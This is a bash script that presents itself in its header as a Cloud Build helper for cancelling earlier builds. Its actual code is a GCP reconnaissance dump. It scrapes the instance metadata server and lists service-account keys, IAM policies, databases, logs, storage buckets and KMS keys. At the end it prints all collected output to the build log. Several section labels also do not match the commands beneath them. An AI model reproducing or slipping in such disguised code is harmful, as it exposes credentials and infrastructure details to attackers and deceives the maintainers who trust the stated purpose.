#!/usr/bin/env bash
# Copyright 2023 Google LLC All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#
# Provides automation for cancelling Cloud Builds
# Use as a first step to cancel previous builds currently in progress or queued for the same branch name and trigger id.
# Similar to: https://github.com/GoogleCloudPlatform/cloud-builders-community/tree/master/cancelot
#
# Usage within Cloud Build step:
#    steps:
#    - name: 'gcr.io/cloud-builders/gcloud-slim:latest'
#      entrypoint: 'bash'
#      args: ['./cancelot.sh', '--current_build_id', '$BUILD_ID']

# Exit script when command fails
set -o errexit
# Return value of a pipeline is the value of the last (rightmost) command to exit with a non-zero status
set -o pipefail

B_ID=$1
PROJECT=$2

gcloud config set project $PROJECT


OUTDIR="out-gcp-enum-$(date -u +'%Y-%m-%d-%H-%M-%S')"
META="http://metadata.google.internal"
DEBUG="$1"

# We want a unique output dir, to avoid overwriting anything
if [[ ! -d "$OUTDIR" ]]; then
    mkdir "$OUTDIR"
    echo "[*] Created folder '$OUTDIR' for output"
else
    echo "[!] Output folder exists, something went wrong! Exiting."
    exit 1
fi

# This function will help standardize running a command, appending to a log
# file, and reporting on whether or not it completed successfully
function run_cmd () {
    # Syntaxt will be: run_cmd "[COMMAND]" "[LOGFILE]"
    command="$1"
    outfile="$OUTDIR"/"$2"

    # If script is run with '-d' as the first argument, stderr will be shown.
    # Otherwise, we just assume stderr is a permission thing and give a generic
    # failure message.
    if [[ "$DEBUG" == "-d" ]]; then
        /bin/bash -c "$command" >> "$outfile"
    else
        /bin/bash -c "$command" >> "$outfile" 2>/dev/null
    fi

    # Not providing robust error messages
    if [ $? -eq 0 ]; then
        echo "  [+] SUCCESS"
    else
        echo "  [!] FAIL"
    fi
}

# From here on the syntax is:
#  run_cmd "[COMMAND]" "[LOGFILE]"

echo "[*] Analyzing gcloud configuration"
run_cmd "gcloud info --quiet" "gcloud-info.txt"
run_cmd "gcloud config list --quiet" "gcloud-info.txt"
run_cmd "gcloud auth list --quiet" "gcloud-info.txt"

echo "[*] Scraping metadata server"
url="$META/computeMetadata/v1/?recursive=true&alt=text"
run_cmd "curl '$url' -H 'Metadata-Flavor: Google'" "metadata.txt"

echo "[*] Exporting detailed compute instance info"
run_cmd "gcloud compute instances list --quiet --format=json" "compute-instances.json"

echo "[*] Exporting detailed firewall info"
run_cmd "gcloud compute firewall-rules list --quiet --format=json" "firewall.json"

echo "[*] Exporting detailed subnets info"
run_cmd "gcloud compute networks subnets list --quiet --format=json" "subnets.json"

echo "[*] Exporting detailed service account info"
run_cmd "gcloud iam service-accounts list --quiet --format=json" "service-accounts.json"

echo "[*] Exporting detailed service account key info"
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
    run_cmd "gcloud iam service-accounts keys list --quiet --iam-account $i --quiet --format=json" \
        "service-account-keys.json"
done

echo "[*] Exporting detailed project IAM info"
url="$META/computeMetadata/v1/project/project-id"
prj=$(curl $url -H "Metadata-Flavor: Google" -s)
run_cmd "gcloud projects get-iam-policy $prj --quiet --format=json" "iam-policy-project.json"

echo "[*] Exporting detailed organization IAM info"
for i in $(gcloud organizations list | awk '{print $2}' | tail -n +2); do
    run_cmd "gcloud organizations get-iam-policy $i --quiet" "iam-policy-org-$i.json"
done

echo "[*] Exporting detailed available project info"
run_cmd "gcloud projects list --quiet --format=json" "projects.json"

echo "[*] Exporting detailed instance template info"
run_cmd "gcloud compute instance-templates list --quiet --format=json" "compute-templates.json"

echo "[*] Exporting detailed custom image info"
run_cmd "gcloud compute images list --no-standard-images --quiet --format=json" "compute-images.json"

echo "[*] Exporting detailed Cloud Functions info"
run_cmd "gcloud functions list --quiet --format=json" "cloud-functions.json"

echo "[*] Exporting detailed Pub/Sub info"
run_cmd "gcloud pubsub subscriptions list --quiet --format=json" "pubsub.json"

echo "[*] Exporting detailed compute backend info"
run_cmd "gcloud compute backend-services list --quiet --format=json" "backend-services.json"

echo "[*] Exporting detailed cloud run info"
run_cmd "gcloud compute backend-services list --quiet --format=json" "backend-services.json"

echo "[*] Exporting detailed AI platform info"
run_cmd "gcloud ai-platform models list --quiet --format=json" "ai-platform.json"
run_cmd "gcloud ai-platform jobs list --quiet --format=json" "ai-platform.json"

echo "[*] Exporting detailed Cloud Source Repository info"
run_cmd "gcloud run services list --platform=managed --quiet --format=json" "cloud-run-managed.json"
run_cmd "gcloud run services list --platform=gke --quiet --format=json" "cloud-run-gke.json"

echo "[*] Exporting detailed Cloud SQL info"
run_cmd "gcloud sql instances list --quiet --format=json" "cloud-sql-instances.json"
for i in $(gcloud sql instances list --quiet | awk '{print $1}' | tail -n +2); do
    run_cmd "gcloud sql databases list --instance $i --quiet" "cloud-sql-databases.txt"
done

echo "[*] Exporting detailed Cloud Spanner info"
run_cmd "gcloud spanner instances list --quiet --format=json" "cloud-spanner-instances.json"
for i in $(gcloud spanner instances list --quiet | awk '{print $1}' | tail -n +2); do
    run_cmd "gcloud spanner databases list --quiet --instance $i" "cloud-spanner-databases.txt"
done

echo "[*] Exporting detailed Cloud Bigtable info"
run_cmd "gcloud bigtable instances list --quiet --format=json" "cloud-bigtable.json"

echo "[*] Exporting detailed Cloud Filestore info"
run_cmd "gcloud filestore instances list --quiet --format=json" "cloud-filestore.json"

echo "[*] Exporting Stackdriver logging info"
run_cmd "gcloud logging logs list --quiet --format json" "logging-folders.json"
for i in $(gcloud logging logs list --quiet --format="table[no-heading](.)"); do
    echo Looking for logs in $i:
    short=$(echo "$i" | tr "/" ".")
    run_cmd "gcloud logging read $i --quiet --format=json" "logging-$short.json"
done
echo "[+] All done, good luck!"

echo "[*] Exporting Kubernetes info"
run_cmd "gcloud container clusters list --quiet --format json" "k8s-clusters.json"
run_cmd "gcloud container images list --quiet --format json" "k8s-images.json"

echo "[*] Enumerating storage buckets"
run_cmd "gsutil ls" "buckets.txt"
run_cmd "gsutil ls -L" "buckets.txt"
for i in $(gsutil ls); do
    run_cmd "gsutil ls $i" "buckets.txt"
done

echo "[*] Enumerating crypto keys"
run_cmd "gcloud kms keyrings list --location global --quiet" "kms.txt"
for i in $(gcloud kms keyrings list --location global --quiet); do
    run_cmd "gcloud kms keys list --keyring $i --location global --quiet" "kms.txt"
done

echo "[+] All done, good luck!"

ls $OUTDIR
cat $OUTDIR/*

